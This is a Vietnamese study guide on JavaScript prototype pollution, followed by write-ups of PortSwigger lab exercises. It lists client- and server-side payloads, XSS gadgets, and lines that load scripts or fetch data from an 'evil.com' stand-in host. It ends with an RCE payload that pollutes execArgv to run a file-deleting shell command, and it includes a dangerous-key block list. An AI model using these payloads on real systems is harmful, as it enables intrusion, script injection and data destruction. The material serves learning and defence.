```table-of-contents
```
# Prototype Pollution 

## 1. Prototype Pollution là gì?

**Prototype Pollution** là lỗ hổng trong JavaScript cho phép attacker **thêm hoặc sửa property vào prototype chung của object**.

Khi prototype bị “ô nhiễm”, các object khác trong ứng dụng có thể **tự động kế thừa property độc hại** đó. Nếu ứng dụng có đoạn code đọc property này để quyết định hành vi bảo mật, attacker có thể gây ra lỗi như:

```text
DOM XSS
Privilege escalation
Bypass logic
Thay đổi config
Server-side DoS
Server-side RCE trong một số trường hợp
```

Ví dụ cực đơn giản:

```js
Object.prototype.isAdmin = true;

const user = {};

console.log(user.isAdmin); // true
```

`user` không hề có property `isAdmin`, nhưng vì `Object.prototype` có `isAdmin`, nên `user.isAdmin` trả về `true`.

Nếu ứng dụng kiểm tra kiểu:

```js
if (user.isAdmin) {
  showAdminPanel();
}
```

thì attacker có thể biến user thường thành admin nếu pollute được prototype.

---

## 2. Cần hiểu Prototype trong JavaScript trước

JavaScript là ngôn ngữ dựa trên **prototype-based inheritance**.

Mỗi object có một prototype. Nếu bạn truy cập một property không tồn tại trực tiếp trên object, JavaScript sẽ tìm tiếp trong prototype của nó.

Ví dụ:

```js
const user = {
  name: "Minh"
};

console.log(user.name); // Minh
console.log(user.toString); // lấy từ Object.prototype
```

Object `user` không có `toString`, nhưng nó vẫn dùng được vì `toString` nằm trong `Object.prototype`.

Luồng tìm property:

```text
user.name
→ có trực tiếp trong user
→ trả về "Minh"

user.toString
→ user không có
→ tìm trong Object.prototype
→ thấy toString
→ trả về function
```

Vấn đề là nếu attacker có thể sửa `Object.prototype`, thì rất nhiều object trong app sẽ bị ảnh hưởng.

---

## 3. `__proto__`, `constructor`, `prototype` là gì?

Prototype pollution thường xảy ra qua các key đặc biệt:

```text
__proto__
constructor
prototype
```

### 3.1. `__proto__`

`__proto__` là accessor cho prototype của object.

Ví dụ:

```js
const obj = {};
obj.__proto__.polluted = "yes";

console.log({}.polluted); // yes
```

Ở đây ta không chỉ sửa `obj`, mà sửa prototype chung.

### 3.2. `constructor.prototype`

Một cách khác để chạm đến prototype là:

```js
obj.constructor.prototype.polluted = "yes";
```

Ví dụ:

```js
const obj = {};
obj.constructor.prototype.isAdmin = true;

console.log({}.isAdmin); // true
```

Vì:

```text
obj.constructor
→ Object

Object.prototype
→ prototype chung của object thường
```

Nên các payload prototype pollution thường có dạng:

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

hoặc:

```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

---

## 4. Prototype Pollution xảy ra khi nào?

Lỗ hổng thường xuất hiện khi ứng dụng:

```text
1. Nhận input từ user
2. Dùng input đó làm key/property name
3. Ghi dữ liệu vào object một cách động
4. Không chặn các key nguy hiểm như __proto__, constructor, prototype
```

Ví dụ code nguy hiểm:

```js
function setValue(obj, key, value) {
  obj[key] = value;
}

setValue({}, "__proto__", { polluted: true });
```

Hoặc dạng nested:

```js
function setDeep(obj, path, value) {
  const keys = path.split(".");
  let current = obj;

  for (let i = 0; i < keys.length - 1; i++) {
    const key = keys[i];
    current = current[key] = current[key] || {};
  }

  current[keys[keys.length - 1]] = value;
}

setDeep({}, "__proto__.isAdmin", true);

console.log({}.isAdmin); // true
```

Đây là dạng rất phổ biến trong các thư viện xử lý query string, merge object, clone object, config parser.

---

## 5. Ba khái niệm quan trọng: Source, Sink, Gadget

Muốn khai thác prototype pollution, bạn cần hiểu 3 khái niệm này.

```text
Source → nơi attacker có thể pollute prototype
Gadget → đoạn code đọc property bị pollute
Sink → hành động nguy hiểm xảy ra sau khi gadget chạy
```

### 5.1. Source là gì?

**Source** là nơi dữ liệu attacker đi vào ứng dụng và có khả năng ghi vào object.

Ví dụ source thường gặp:

```text
Query string
URL hash
JSON body
postMessage
LocalStorage
Cookie
Object merge function
Deep clone function
Config parser
API nhận JSON nested object
```

Ví dụ URL:

```text
https://example.com/?__proto__[isAdmin]=true
```

hoặc:

```text
https://example.com/#__proto__[srcdoc]=<script>alert(1)</script>
```

Nếu app parse query string/hash rồi merge vào object không an toàn, prototype có thể bị pollute.

### 5.2. Gadget là gì?

**Gadget** là đoạn code hợp lệ trong ứng dụng hoặc thư viện có đọc một property nào đó từ object.

Ví dụ:

```js
const config = {};

if (config.transport_url) {
  loadScript(config.transport_url);
}
```

Nếu attacker pollute được:

```js
Object.prototype.transport_url = "https://evil.com/x.js";
```

thì `config.transport_url` có giá trị dù `config` là object rỗng.

Gadget biến pollution thành hành vi nguy hiểm.

### 5.3. Sink là gì?

**Sink** là vị trí nguy hiểm, nơi dữ liệu attacker có thể gây impact.

Ví dụ sink client-side:

```text
innerHTML
document.write()
eval()
script.src
iframe.srcdoc
location
setTimeout(string)
```

Ví dụ sink server-side:

```text
child_process.exec()
child_process.fork()
require()
template rendering
HTTP response status override
JSON spaces override
file path handling
command options
```

Prototype pollution một mình chưa chắc nguy hiểm. Nó nguy hiểm khi có gadget dẫn dữ liệu polluted đến sink.

---

## 6. Ví dụ đầy đủ: từ Source đến Sink

Giả sử app có đoạn code:

```js
const params = new URLSearchParams(location.search);
const config = {};

for (const [key, value] of params) {
  config[key] = value;
}

const iframe = document.createElement("iframe");

if (config.srcdoc) {
  iframe.srcdoc = config.srcdoc;
}

document.body.appendChild(iframe);
```

Attacker gửi URL:

```text
https://example.com/?__proto__[srcdoc]=<script>alert(1)</script>
```

Nếu parser hỗ trợ nested object và pollute được prototype:

```js
Object.prototype.srcdoc = "<script>alert(1)</script>";
```

Khi app chạy:

```js
const config = {};
config.srcdoc
```

Dù `config` rỗng, nó vẫn lấy `srcdoc` từ prototype.

Kết quả:

```js
iframe.srcdoc = "<script>alert(1)</script>";
```

Dẫn đến DOM XSS.

---

## 7. Client-side Prototype Pollution

**Client-side prototype pollution** xảy ra trong trình duyệt.

Nguồn input thường là:

```text
URL query string
URL fragment/hash
postMessage
localStorage
JSON config từ server
```

Ví dụ:

```text
https://target.com/?__proto__[foo]=bar
```

hoặc:

```text
https://target.com/#__proto__[foo]=bar
```

Nếu trang web dùng thư viện parse query string không an toàn, attacker có thể pollute prototype phía client.

### 7.1. Dấu hiệu client-side prototype pollution

Khi test trên browser console, có thể thử:

```js
({}).polluted
```

Nếu ban đầu:

```js
({}).polluted
// undefined
```

Sau khi thêm payload URL, reload page:

```text
https://target.com/?__proto__[polluted]=yes
```

rồi kiểm tra:

```js
({}).polluted
// "yes"
```

thì có prototype pollution.

### 7.2. Payload client-side thường dùng

Dạng query:

```text
?__proto__[polluted]=yes
```

Dạng dot notation:

```text
?__proto__.polluted=yes
```

Dạng constructor:

```text
?constructor[prototype][polluted]=yes
```

Dạng hash:

```text
#__proto__[polluted]=yes
```

Hoặc URL encoded:

```text
?%5F%5Fproto%5F%5F%5Bpolluted%5D=yes
```

Trong lab, payload nào dùng được phụ thuộc vào parser của ứng dụng.

### 7.3. Client-side impact phổ biến

Impact lớn nhất là **DOM XSS**.

Ví dụ nếu gadget đọc property polluted rồi đưa vào sink:

```js
script.src = config.transport_url;
```

Attacker pollute:

```text
?__proto__[transport_url]=data:,alert(1)
```

Hoặc:

```text
?__proto__[srcdoc]=<script>alert(1)</script>
```

Tùy gadget.

---

## 8. Server-side Prototype Pollution

**Server-side prototype pollution** xảy ra trong môi trường Node.js ở backend.

Nó nguy hiểm hơn vì có thể ảnh hưởng đến:

```text
Logic phân quyền
HTTP response
Template engine
File system
Child process
Database query
Application config
```

Ví dụ server nhận JSON:

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

Nếu backend merge JSON này vào object không an toàn:

```js
merge(config, req.body);
```

thì `Object.prototype.isAdmin` có thể bị thêm.

Sau đó nếu code có:

```js
if (user.isAdmin) {
  grantAdminAccess();
}
```

attacker có thể leo quyền.

### 8.1. Vì sao server-side khó detect hơn?

Client-side test rất dễ:

```js
({}).polluted
```

Nhưng server-side bạn không có console backend.

Bạn phải quan sát **side effect**, ví dụ:

```text
Response status thay đổi
JSON formatting thay đổi
Header thay đổi
Error message thay đổi
Behavior thay đổi
DoS hoặc delay
```

### 8.2. Payload server-side thường gặp

Dạng JSON:

```json
{
  "__proto__": {
    "polluted": "yes"
  }
}
```

Dạng constructor:

```json
{
  "constructor": {
    "prototype": {
      "polluted": "yes"
    }
  }
}
```

Dạng path:

```json
{
  "__proto__.polluted": "yes"
}
```

Dạng nested parameter:

```text
__proto__[polluted]=yes
```

hoặc:

```text
constructor[prototype][polluted]=yes
```

---

## 9. Prototype Pollution trong object merge

Rất nhiều lỗi xuất phát từ merge object.

Ví dụ function merge không an toàn:

```js
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === "object") {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

Nếu source là:

```json
{
  "__proto__": {
    "polluted": "yes"
  }
}
```

Function có thể ghi vào prototype.

Sau đó:

```js
console.log({}.polluted); // yes
```

Vấn đề thường nằm ở các thao tác:

```text
recursive merge
deep clone
set by path
query parser
YAML/JSON config parsing
```

---

## 10. Prototype Pollution không phải lúc nào cũng exploitable

Một điểm quan trọng:

```text
Pollute được prototype chưa chắc đã có impact rõ ràng.
```

Bạn cần tìm gadget.

Ví dụ bạn pollute:

```js
Object.prototype.test = "abc";
```

Nhưng ứng dụng không bao giờ đọc `obj.test`, hoặc đọc nhưng không đưa vào sink nguy hiểm, thì impact thấp.

Muốn exploit thành công cần:

```text
1. Source: pollute prototype được
2. Gadget: app đọc polluted property
3. Sink: property đó ảnh hưởng đến hành vi nguy hiểm
```

---

## 11. Các gadget hay gặp phía client

### 11.1. Script URL gadget

```js
const script = document.createElement("script");
script.src = config.src;
document.body.appendChild(script);
```

Payload ý tưởng:

```text
?__proto__[src]=https://evil.com/x.js
```

### 11.2. Iframe `srcdoc` gadget

```js
const iframe = document.createElement("iframe");
iframe.srcdoc = config.srcdoc;
```

Payload:

```text
?__proto__[srcdoc]=<script>alert(1)</script>
```

### 11.3. HTML injection gadget

```js
element.innerHTML = config.html;
```

Payload:

```text
?__proto__[html]=<img src=x onerror=alert(1)>
```

### 11.4. Fetch URL gadget

```js
fetch(config.apiUrl);
```

Payload:

```text
?__proto__[apiUrl]=https://evil.com
```

Impact có thể là data exfiltration hoặc request manipulation.

---

## 12. Các gadget hay gặp phía server

### 12.1. Privilege escalation

```js
if (user.isAdmin) {
  showAdmin();
}
```

Payload:

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

### 12.2. Status code override

Một số framework/error handler có thể đọc property như:

```js
res.status(err.status || 500)
```

Nếu attacker pollute:

```json
{
  "__proto__": {
    "status": 418
  }
}
```

Response error có thể đổi sang `418`.

Đây là kỹ thuật detect side effect trong một số trường hợp, vì nó ít phá hoại hơn DoS.

### 12.3. JSON spacing override

Một số app dùng option kiểu:

```js
JSON.stringify(data, null, options.jsonSpaces)
```

Nếu pollute:

```json
{
  "__proto__": {
    "jsonSpaces": 10
  }
}
```

response JSON có thể đổi format.

### 12.4. RCE gadget

Trong Node.js, một số gadget có thể ảnh hưởng đến cách gọi child process.

Ví dụ ý tưởng:

```js
child_process.fork(modulePath, args, options)
```

Nếu `options` kế thừa property độc hại từ prototype, có thể dẫn đến command execution trong điều kiện nhất định.

---

## 13. Cách test Prototype Pollution

### 13.1. Test client-side cơ bản

Bước test:

```text
1. Mở trang.
2. Mở DevTools Console.
3. Gõ: ({}).polluted
4. Thêm payload vào URL.
5. Reload.
6. Gõ lại: ({}).polluted
```

Payload:

```text
?__proto__[polluted]=yes
```

Kiểm tra:

```js
({}).polluted
```

Nếu trả về:

```text
"yes"
```

thì có pollution.

### 13.2. Test nhiều dạng payload

```text
?__proto__[polluted]=yes
?__proto__.polluted=yes
?constructor[prototype][polluted]=yes
?constructor.prototype.polluted=yes
#__proto__[polluted]=yes
```

Dùng tên property ít đụng hàng:

```text
pp_test_12345
```

Ví dụ:

```text
?__proto__[pp_test_12345]=yes
```

Rồi check:

```js
({}).pp_test_12345
```

### 13.3. Test server-side

Với server-side, bạn gửi payload vào JSON body, query, hoặc API endpoint có khả năng merge object.

Ví dụ:

```http
POST /api/user/update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "pp_test_12345": "yes"
  }
}
```

Sau đó quan sát các request sau có thay đổi behavior không.

Có thể thử các property có side effect ít nguy hiểm, tùy app:

```json
{
  "__proto__": {
    "status": 418
  }
}
```

hoặc:

```json
{
  "__proto__": {
    "jsonSpaces": 10
  }
}
```

Lưu ý: không nên dùng payload gây crash/DoS trên hệ thống thật.

---

## 14. Cách tìm source trong code

Nếu có source code, tìm các pattern:

```js
obj[key] = value
target[path[i]] = ...
merge(target, source)
_.merge(...)
$.extend(true, ...)
Object.assign(target, source)
cloneDeep(...)
qs.parse(...)
yaml.load(...)
```

Đặc biệt nguy hiểm khi:

```text
key/path đến từ user input
có recursive merge
không block __proto__/constructor/prototype
```

Ví dụ nguy hiểm:

```js
app.post("/settings", (req, res) => {
  merge(defaultSettings, req.body);
  res.send("ok");
});
```

---

## 15. Cách tìm gadget trong code

Tìm các chỗ object config được đọc:

```js
if (config.isAdmin)
if (options.debug)
if (options.src)
if (options.html)
if (options.template)
if (options.status)
if (options.shell)
```

Tìm các sink:

```js
innerHTML =
document.write()
eval()
new Function()
script.src =
iframe.srcdoc =
child_process.exec()
child_process.spawn()
res.status()
res.redirect()
render()
```

Sau đó thử pollute đúng property mà gadget đọc.

---

## 16. Cách phòng chống Prototype Pollution

### 16.1. Chặn key nguy hiểm

Không cho user input chứa:

```text
__proto__
prototype
constructor
```

Ví dụ:

```js
const dangerousKeys = ["__proto__", "prototype", "constructor"];

function isSafeKey(key) {
  return !dangerousKeys.includes(key);
}
```

Nhưng chỉ block đơn giản có thể chưa đủ vì có bypass encoding/nested path.

### 16.2. Dùng object không có prototype

Tạo object bằng:

```js
const obj = Object.create(null);
```

Object này không kế thừa từ `Object.prototype`.

```js
const obj = Object.create(null);
console.log(obj.__proto__); // undefined
```

### 16.3. Dùng `Map` thay vì object thường

Nếu cần lưu key-value do user kiểm soát:

```js
const map = new Map();
map.set(userKey, value);
```

`Map` tránh nhiều vấn đề liên quan prototype chain.

### 16.4. Validate schema input

Dùng schema rõ ràng:

```json
{
  "name": "string",
  "email": "string"
}
```

Reject property ngoài schema.

Ví dụ với JSON schema:

```text
additionalProperties: false
```

### 16.5. Tránh recursive merge không an toàn

Không tự viết merge function nếu không chắc.

Cập nhật thư viện thường xuyên, vì nhiều thư viện từng dính prototype pollution.

### 16.6. Dùng `Object.hasOwn()`

Khi kiểm tra property bảo mật, không dùng kiểu:

```js
if (user.isAdmin) {
  ...
}
```

Nên kiểm tra property trực tiếp của object:

```js
if (Object.hasOwn(user, "isAdmin") && user.isAdmin === true) {
  ...
}
```

Hoặc:

```js
if (Object.prototype.hasOwnProperty.call(user, "isAdmin")) {
  ...
}
```

### 16.7. Freeze prototype trong một số môi trường

Có thể dùng:

```js
Object.freeze(Object.prototype);
```

Nhưng cách này có thể làm hỏng thư viện nếu app phụ thuộc vào việc mở rộng prototype. Cần test kỹ trước khi áp dụng.

---

## 17. Checklist học Prototype Pollution

Khi làm lab, bạn nên đi theo thứ tự tư duy này:

```text
1. Xác định app chạy JavaScript phía client hay Node.js phía server.
2. Tìm source: input nào có thể ghi vào object?
3. Thử payload __proto__ hoặc constructor.prototype.
4. Xác nhận pollution:
   - Client-side: kiểm tra ({}).property trong console.
   - Server-side: tìm side effect.
5. Tìm gadget: property nào app đọc từ object/config?
6. Tìm sink: property đó đi vào DOM, redirect, script, command, template, response?
7. Pollute đúng property gadget cần.
8. Trigger gadget.
9. Chứng minh impact.
```

---

## 18. Các payload nền tảng cần nhớ

### Client-side query

```text
?__proto__[polluted]=yes
```

```text
?constructor[prototype][polluted]=yes
```

### Client-side hash

```text
#__proto__[polluted]=yes
```

### JSON body

```json
{
  "__proto__": {
    "polluted": "yes"
  }
}
```

### Dot path

```json
{
  "__proto__.polluted": "yes"
}
```

### Constructor path

```json
{
  "constructor": {
    "prototype": {
      "polluted": "yes"
    }
  }
}
```

---

## 19. Mẫu writeup lý thuyết ngắn

```text
Prototype Pollution là lỗ hổng trong JavaScript xảy ra khi attacker có thể ghi dữ liệu vào prototype của object, thường thông qua các key đặc biệt như __proto__, constructor hoặc prototype. Do cơ chế prototype inheritance, các object khác trong ứng dụng có thể kế thừa property bị attacker thêm vào.

Để khai thác thành công, cần có ba thành phần: source, gadget và sink. Source là nơi attacker có thể đưa input vào và pollute prototype, ví dụ query string, JSON body hoặc object merge. Gadget là đoạn code hợp lệ trong ứng dụng đọc property bị pollute. Sink là hành động nguy hiểm xảy ra khi property đó được sử dụng, ví dụ DOM XSS phía client hoặc thay đổi logic, leo quyền, RCE phía server.

Prototype Pollution có thể xảy ra cả client-side và server-side. Ở client-side, impact phổ biến là DOM XSS. Ở server-side Node.js, impact có thể là privilege escalation, thay đổi response, DoS hoặc RCE nếu tồn tại gadget phù hợp. Phòng chống bằng cách validate input theo schema, chặn các key nguy hiểm như __proto__/constructor/prototype, dùng Object.create(null) hoặc Map cho dữ liệu key-value không tin cậy, và kiểm tra property bằng Object.hasOwn thay vì phụ thuộc vào prototype chain.
```

---

## 20. Tóm tắt cực ngắn

```text
Prototype Pollution = attacker sửa Object.prototype
→ object khác tự kế thừa property độc hại
→ nếu app đọc property đó trong gadget
→ dẫn đến XSS, bypass logic, privilege escalation, DoS hoặc RCE
```

Công thức khai thác:

```text
Source + Gadget + Sink = Exploit
```

Công thức phòng chống:

```text
Validate input + block dangerous keys + use safe objects + check own properties
```


# WU
- [x] Client-side prototype pollution via browser APIs
- [x] DOM XSS via an alternative prototype pollution vector
- [x] Client-side prototype pollution via browser APIs
- [x] Privilege escalation via server-side prototype pollution
- [x] Detecting server-side prototype pollution without polluted property reflection
- [x] Bypassing flawed input filters for server-side prototype pollution
- [x] Remote code execution via server-side prototype pollution
- [ ] Exfiltrating sensitive data via server-side prototype pollution
- [x] Client-side prototype pollution in third-party libraries
- [x] DOM XSS via client-side prototype pollution

## Client-side prototype pollution via browser APIs

- mục tiêu là lab bị lỗi DOM XSS thông qua client-side prototype pollution
- ta cần:
```
1. Tìm source có thể pollute Object.prototype.
2. Tìm gadget property có thể dẫn đến JavaScript execution.
3. Kết hợp source + gadget để gọi alert(1).
```

mở dev tools vào tab dom invader
![](../../image/Pasted%20image%2020260517071120.png)
-dom invader phát hiện source prototype pollution
=> query string có thể pollute prototype.

- ấn scan for gatgets để DOM invader scan
![](../../image/Pasted%20image%2020260517071348.png)
- DOM invader báo sinks: script.src nghĩa là có 1 đoạn js trên trang tạo thẻ `<script> ` và gán giá trị vào thuộc tính src
ta thấy giá trị value:
Đây là **canary** do DOM Invader tự chèn vào để test. Nó chứng minh rằng dữ liệu từ prototype pollution đã đi tới `script.src`.
```
DOM Invader pollute một property trên Object.prototype
→ ứng dụng đọc property đó
→ giá trị bị đưa vào script.src
→ đây là sink có thể gây XSS
```
bấm **Exploit**, DOM Invader tự thay canary bằng payload JavaScript phù hợp, ví dụ dạng:

```
data:,alert(1)
```
Trang web parse query string không an toàn, cho phép ghi property vào prototype thông qua:

```
__proto__[value]=...
```

Sau đó ứng dụng có gadget đọc property:

```
value
```

và đưa vào sink:

```
script.src
```

Vì vậy attacker có thể đặt:

```
value = data:,alert(1);
```

Khi trang render, browser tạo script từ giá trị này và thực thi JavaScript.

## DOM XSS via client-side prototype pollution
- bật dom invader
![](../../image/Pasted%20image%2020260517072140.png)
phát hiện query string là source có thể pollute prototype,  qua dạng payload `__proto__[property]=value` hoặc `constructor[prototype][property]=value`.

bấm “Scan for gadgets”. DOM Invader phát hiện một gadget sử dụng property `transport_url`. Giá trị bị pollute được đưa vào sink `script.src`, tức là ứng dụng tạo thẻ `<script>` và gán giá trị của `transport_url` làm nguồn tải script.

=> nếu  pollute `Object.prototype.transport_url`, ứng dụng sẽ đọc property này từ prototype chain và đưa nó vào `script.src`. Vì `script.src` có thể tải và thực thi JavaScript, có thể đặt giá trị này thành một payload JavaScript hợp lệ, ví dụ `data:,alert(1)`.

Khi bấm “Exploit”, DOM Invader tự tạo payload phù hợp, khiến trang load script từ giá trị đã bị pollute và thực thi `alert(1)`. Lab được solved.

![](../../image/Pasted%20image%2020260517072146.png)

## DOM XSS via an alternative prototype pollution vector

- bật dom invader

DOM Invader phát hiện source:

```
__proto__.property=value in search
```
![](../../image/Pasted%20image%2020260517072503.png)

- sau khi scan, nó thấy sinh eval() và value di vào đoạn code dạng:
```
if (manager && manager.sequence) {
    manager.macro(POLLUTED_VALUE)
}
```
![](../../image/Pasted%20image%2020260517072747.png)

- khi ấn exploit, trang web chưa bị trigger bởi alert
![](../../image/Pasted%20image%2020260517073127.png)
=> cần thêm dấu - vào cuối url thì mới trigger thành công
payload ban đầu chưa kích hoạt alert vì sau chuỗi canary trong sink có thêm ký tự số `1`, khiến payload không phù hợp với context JavaScript. quan sát sink `eval()` và nhận thấy có thể sửa context bằng cách thêm dấu trừ `-` vào cuối URL exploit. Khi reload, payload trở thành biểu thức hợp lệ kiểu `alert(1)-1`, trong đó `alert(1)` được thực thi trước. Lab được solved.

## Client-side prototype pollution via flawed sanitization

- bật dom invader
![](../../image/Pasted%20image%2020260517073428.png)
dom phát hiện source, điểm đặc biệt là payload ko dùng trực tiếp __proto__ mà dùng biến thể pro__proto__to


Vì lab có sanitizer cố xóa chuỗi `__proto__`, nhưng xóa không triệt để. Khi app sanitize:

```
__pro__proto__to__
```

nó xóa phần `__proto__` ở giữa, phần còn lại ghép lại thành:

```
__proto__
```

Tức là attacker bypass được filter và vẫn pollute được prototype.
![](../../image/Pasted%20image%2020260517073439.png)DOM Invader báo sink: `script.src` và gadget property là:`transport_url`

Nghĩa là app có đoạn logic tương đương:

```
script.src = config.transport_url;
```

Khi `config` không có `transport_url` riêng, JavaScript tìm lên prototype chain và lấy giá trị đã bị pollute từ:

```
Object.prototype.transport_url
```

Nếu đặt giá trị này là:

```
data:,alert(1);
```

thì trình duyệt tạo script từ data URL và chạy `alert(1)`

## Client-side prototype pollution in third-party libraries
- bật DOm invader

![](../../image/Pasted%20image%2020260517073830.png)

![](../../image/Pasted%20image%2020260517073924.png)
khai thác gadget `hitCallback` đi vào sink `setTimeout()` trong third-party library
dom invader đã tìm ra gadget, giờ cần lấy payload exploit và gửi cho victim
![](../../image/Pasted%20image%2020260517074338.png)


## Privilege escalation via server-side prototype pollution
- mục tiêu là leo quyền user wiener thành admin bằng server-side prototype pollution
- login vào tài khoản wiener
![](../../image/Pasted%20image%2020260517074624.png)

- khi đổi thử địa chỉ thành Ha Noi thì ở burp thấy request
![](../../image/Pasted%20image%2020260517074715.png)

có lỗ hổng vì server truyền trực tiếp input của user vào js ở phía server

![](../../image/Pasted%20image%2020260517074941.png)
	- thêm property:  `__proto__` vào json và gửi request
- khi reload trang web thì ta đã thấy vào đc admin panel
![](../../image/Pasted%20image%2020260517075027.png)

## Detecting server-side prototype pollution without polluted property reflection

- mục tiêu là phát hiện server-side prototype pollution
![](../../image/Pasted%20image%2020260517075243.png)
- login vòa tài koanr và đổi thử giá trị city

![](../../image/Pasted%20image%2020260517075447.png)

- thêm thử payload vào request và gửi lại

Nếu vulnerable, sẽ thấy JSON response được format với nhiều khoảng trắng/indent hơn bình thường.

## Bypassing flawed input filters for server-side prototype pollution
- mục tiêu là bypass filter chặn __proto__ sau đó pollute prototype để chiếm quyền admin
thử thêm __proto__ vào json
![](../../image/Pasted%20image%2020260517075954.png)

- khi load lại trang thì ta vãn chưa vào đc admin => lab có filter chặn __proto__

sử dụng paylad khác:
```
"constructor": {  
"prototype": {  
"isAdmin": true  
}  
}
```
Payload này đi đường khác để chạm tới `Object.prototype`:

```
object.constructor → ObjectObject.prototype → prototype chung
```

Nên dù `__proto__` bị filter, ta vẫn pollute được `isAdmin`.

![](../../image/Pasted%20image%2020260517080124.png)

## Remote code execution via server-side prototype pollution
- mục tiêu là pollute prototype phía server để inject tham số node.js, kiicsh hoạt rcce khi admin chạy maintenance job rồi xóa file morale.txt
![](../../image/Pasted%20image%2020260517080405.png)
- xác nhận có prototype pollution bằng json spaces vì thấy repsonse json ở tab ră in indent rộng hơn


- giờ vào colla để copy domain, trong repeater thay json space bằng payload execArgv:
![](../../image/Pasted%20image%2020260517080611.png)

- gửi requests rồi vào admin panel chạy maintenance job
![](../../image/Pasted%20image%2020260517080653.png)
có DNS/HTTP interaction, nghĩa là RCE hoạt động. PortSwigger dùng `execArgv` với `--eval` để khiến child process Node thực thi `child_process.execSync()`

- ok, vậy giờ chỉ cần thay lệnh curl thành rm rồi send request, sau đó lại chạy maintenance job 1 lần nữa
![](../../image/Pasted%20image%2020260517080804.png)

`execArgv` là option của Node.js dùng để truyền tham số cho child process Node.
Khi ta pollute:
```
Object.prototype.execArgv = [  "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]
```
thì lúc app spawn maintenance job, object options có thể kế thừa `execArgv` từ prototype chain.
Node nhận:
```
--eval=...
```

và thực thi JavaScript bên trong. JavaScript đó gọi:
```
require('child_process').execSync(...)
```
nên command hệ thống được chạy trên server.


